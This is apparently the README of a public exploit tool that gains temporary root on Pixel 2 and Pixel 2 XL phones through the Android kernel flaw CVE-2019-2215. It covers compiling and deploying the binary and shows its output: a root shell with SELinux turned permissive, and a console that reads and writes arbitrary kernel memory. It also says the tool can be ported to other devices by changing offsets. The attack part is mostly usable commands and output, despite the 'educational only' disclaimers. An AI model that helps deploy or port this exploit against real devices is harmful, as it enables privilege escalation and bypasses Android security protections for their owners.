# CVE-2019-2215
### Temproot for Pixel 2 and Pixel 2 XL via CVE-2019-2215
#### (Based on a [proof-of-concept](https://bugs.chromium.org/p/project-zero/issues/detail?id=1942) by Jann Horn & Maddie Stone of Google Project Zero)
----
## Overview
Demonstration of a kernel memory R/W-only privilege escalation attack resulting in a temporary root shell.

It works on Google [Pixel 2](https://dl.google.com/dl/android/aosp/walleye-ota-qp1a.190711.020-d326cba7.zip)/[Pixel 2 XL](https://dl.google.com/dl/android/aosp/taimen-ota-qp1a.190711.020-4757f073.zip) (walleye/taimen) devices running the September 2019 QP1A.190711.020 image with kernel version-BuildID **`4.4.177-g83bee1dc48e8`**.

For this tool to work on other devices and/or kernels affected by the same vulnerability, some offsets need to be found and changed. As mentioned on the [Project Zero bugtracker](https://bugs.chromium.org/p/project-zero/issues/detail?id=1942), this isn't terribly difficult.

Also included is a [mini debug console](#debug-console) that provides a hex editor-like interface for touching kernel memory and the ability to spawn a shell.

## Disclaimers
* ### [This tool](https://kangtastic.github.io/cve-2019-2215/cve-2019-2215.zip), and its [source](https://github.com/kangtastic/cve-2019-2215/blob/master/cve-2019-2215.c), are made available for documentary and educational purposes only.
* ### Do not use this tool. It is a bad idea.
* ### Help, support, updates&mdash;pick none.

## Compilation
For convenience, a **`Makefile`** is included that works with the cross-compiler toolchain from [Android NDK](https://developer.android.com/ndk/downloads/index.html) r19 or higher.

```console
# Download the Android NDK.
user@host:~$ wget https://dl.google.com/android/repository/android-ndk-r20-linux-x86_64.zip

# Extract the NDK and set its path as $ANDROID_NDK_HOME.
user@host:~$ unzip android-ndk-r20-linux-x86_64.zip
user@host:~$ rm android-ndk-r20-linux-x86_64.zip  # optional
user@host:~$ export ANDROID_NDK_HOME=~/android-ndk-r20

# Clone the `cve-2019-2215` git repository and `cd` into it.
user@host:~$ git clone https://github.com/kangtastic/cve-2019-2215.git
user@host:~$ cd cve-2019-2215

# Compile the binary.
user@host:~/cve-2019-2215$ make all  # all, clean, debug, debug-static, static, strip
user@host:~/cve-2019-2215$ file cve-2019-2215
cve-2019-2215: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV),
dynamically linked, interpreter /system/, stripped
```

## Usage
###### (sample outputs captured on a Pixel 2 XL via [adb](https://developer.android.com/studio/command-line/adb))
### Temproot
Once the binary is compiled, transfer it onto the device, set it executable, and run it. (Somewhere in **`/data/`** should work.)
#### Example
```console
taimen:/ $ cd /data/local/tmp
taimen:/data/local/tmp $ install -m 755 /sdcard/cve-2019-2215 ./
taimen:/data/local/tmp $ ./cve-2019-2215
Temproot for Pixel 2 and Pixel 2 XL via CVE-2019-2215
[+] startup
[+] find kernel address of current task_struct
[+] obtain arbitrary kernel memory R/W
[+] find kernel base address
[+] bypass SELinux and patch current credentials
taimen:/data/local/tmp # id
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),
1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),
3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:kernel:s0
taimen:/data/local/tmp # getenforce
Permissive
taimen:/data/local/tmp # exit
taimen:/data/local/tmp $
```
Success is not guaranteed and the device may even outright crash, but usually, SELinux is set **`Permissive`** and a root shell is spawned.
### Debug console
Pass **`debug`** as the sole command-line argument to start a mini debug console instead of the privilege escalation routine after kernel R/W is achieved.
#### Command reference
```console
debug> help
quick help
    print
        print kernel base address, some kernel symbol offsets,
        and address of current task_struct as hexstrings
    read <kaddr> <len>
        read <len> bytes from <kaddr> and display as a hexdump
        <kaddr> is a hexstring not prefixed with 0x
        <len> is 1-4096 or 0x1-0x1000
    write <kaddr> <data>
        write <data> to <kaddr>
        <kaddr> is a hexstring not prefixed with 0x
        <data> is 1-4096 hexbytes, spaces ignored, to be written *AS-IS*
        e.g. if kaddr 0xffffffffdeadbeef contains an int, and you want to set
        its value to 1, enter 'write ffffffffdeadbeef <data>', where <data> is
        '01000000', '0100 0000', '01 00 0 0 00', etc. (our ARM is little-endian)
    shell
        launch a shell (hint: did we ~somehow~ become another user? :P)
    help
        print this help
    exit
        exit debug console
```
#### Example
Set SELinux from **`Permissive`** back to **`Enforcing`** as an unprivileged user.
```console
taimen:/data/local/tmp $ getenforce
Permissive
taimen:/data/local/tmp $ ./cve-2019-2215 debug
Temproot for Pixel 2 and Pixel 2 XL via CVE-2019-2215
[+] startup
[+] find kernel address of current task_struct
[+] obtain arbitrary kernel memory R/W
[+] find kernel base address
launching debug console, enter 'help' for quick help
debug> print
ffffff9bad880000 kernel_base
ffffff9baf8a57d0 init_task
ffffff9baf8af2c8 init_user_ns
ffffff9baf8e3780 selinux_enabled
ffffff9bafc4e4a8 selinux_enforcing
ffffffe6b2942b80 current
debug> read ffffff9bafc4e4a8 35
ffffff9bafc4e4a8: 0000 0000 0100 0000 002e 40b9 faff ffff  ..........@.....
ffffff9bafc4e4b8: 0023 40b9 faff ffff 0000 0000 0000 0000  .#@.............
ffffff9bafc4e4c8: 0000 00                                  ...
debug> write ffffff9bafc4e4a8 01 00 00 00
debug> read ffffff9bafc4e4a8 4
ffffff9bafc4e4a8: 0100 0000                                ....
debug> exit
taimen:/data/local/tmp $ getenforce
Enforcing
taimen:/data/local/tmp $
```
